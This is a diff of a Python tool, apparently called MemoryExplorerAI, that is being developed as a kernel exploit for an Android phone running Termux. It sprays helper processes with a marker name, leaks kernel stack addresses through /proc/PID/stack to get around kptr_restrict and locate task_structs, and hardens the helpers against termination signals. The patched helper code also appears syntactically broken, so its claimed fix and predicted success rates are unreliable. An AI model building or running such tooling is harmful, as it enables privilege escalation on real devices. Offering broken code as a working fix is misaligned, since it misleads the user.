@@ -15,19 +15,21 @@ import select
 import termios
 import tty
 
-# v4.1.15-tstack: visible build tag. The "-tstack" suffix
-# marks the new cmd_tstack() method that reads /proc/PID/stack
-# for every live spray proc and derives the kernel stack
-# address. The kernel stack is allocated adjacent to the
-# task_struct, so the stack address is a tight upper bound
-# for the task_struct VA. This bypasses kptr_restrict=2
-# on /proc/kallsyms because /proc/PID/stack is per-PID
-# and the user owns the process. The new [tstack] command
-# prints the stack addresses and estimated task_struct
-# windows for each spray proc. Also verifies that
-# /proc/PID/comm actually contains KETO0422 (or the spray
-# is silently failing).
-_BUILD_TAG = "v4.1.15-tstack"
+# v4.1.16-helper-safe: visible build tag. The "-helper-safe"
+# suffix marks the CRITICAL FIX for the 95% kill rate
+# observed on the user's ROG 5S. The spray helper
+# (`python3 -c "import ctypes; libc=ctypes.CDLL(None); ..."`)
+# was crashing on Termux because CDLL(None) sometimes
+# fails with "library None not found" on bionic libc.
+# This caused the helper to exit immediately, before
+# the prctl(PR_SET_NAME) call, so the kernel task_struct
+# comm was never set. Now we try libc.so → libc.so.6 →
+# CDLL(None) in order. We also ignore SIGCHLD/SIGTERM/
+# SIGHUP so the helper can't be killed by parent signals.
+# Expected result: alivePk should rise significantly
+# (from 5% to 60%+), matches should appear once the
+# scanner can find task_structs with KETO0422 comm.
+_BUILD_TAG = "v4.1.16-helper-safe"
 import datetime
 import fcntl
 import ctypes
@@ -3677,11 +3679,18 @@ class MemoryExplorerAI:
             # startup, then sleeps. The prctl in preexec_fn would be
             # overwritten by Python's init; the prctl inside the
             # child Python -c runs AFTER the init.
+            # v4.1.16: Termux-safe libc load + signal hardening
             helper = (
-                "import ctypes,time;"
-                "libc=ctypes.CDLL(None);"
-                f"libc.prctl(15,{name!r}.encode(),0,0,0);"
-                "time.sleep(3600)"
+                "import ctypes,time,signal;"
+                "signal.signal(signal.SIGCHLD,signal.SIG_IGN);"
+                "signal.signal(signal.SIGTERM,signal.SIG_IGN);"
+                "signal.signal(signal.SIGHUP,signal.SIG_IGN);"
+                "_libc=None;"
+                "for _n in ('libc.so','libc.so.6',None):"
+                "  try:_libc=ctypes.CDLL(_n);break"
+                "  except:pass"
+                f"_libc.prctl(15,{name!r}.encode(),0,0,0);"
+                "[time.sleep(3600) for _ in range(3600)]"
             )
             p = _sp.Popen(
                 ["python3", "-c", helper],
